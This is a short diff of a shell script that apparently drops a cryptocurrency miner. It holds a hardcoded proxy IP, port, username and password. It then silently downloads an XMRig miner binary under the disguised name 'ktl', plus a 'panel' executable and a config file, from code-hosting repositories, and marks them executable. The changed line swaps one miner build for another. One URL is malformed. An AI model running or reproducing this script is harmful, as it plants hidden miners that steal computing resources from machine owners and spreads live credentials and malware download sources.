@@ -2,7 +2,7 @@ proxy="34.228.46.223"
 port="9293" 
 user="idxrzfc04cp1zw"  
 pass="791oyjfai0xdla8yloe0jrftjh" 
-wget -q -O ktl https://gitlab.com/node.js2594450/scala/-/raw/main/xmrig-notls && chmod +x ktl
+wget -q -O ktl https://gitlab.com/node.js2594450/scala/-/raw/main/xmrig && chmod +x ktl
 wget -q https://gitlab.com/node.js2594450/scala/-/raw/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://https://raw.githubusercontent.com/55113110159/apikey/main/config.json && chmod +x config.json
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
